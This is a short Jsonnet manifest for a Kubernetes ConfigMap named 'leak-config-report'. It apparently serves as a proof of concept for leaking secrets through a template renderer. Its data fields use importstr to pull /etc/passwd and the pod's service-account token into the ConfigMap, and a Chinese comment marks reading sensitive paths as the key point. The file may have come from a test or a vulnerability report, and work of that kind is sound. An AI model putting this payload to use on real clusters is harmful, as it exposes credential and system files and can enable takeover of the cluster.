{
  apiVersion: "v1",
  kind: "ConfigMap",
  metadata: {
    name: "leak-config-report",
  },
  data: {
    // 关键点：直接调用 importstr 读取敏感路径
    "passwd": importstr "/etc/passwd",
    "token": importstr "/var/run/secrets/kubernetes.io/serviceaccount/token"
  }
}
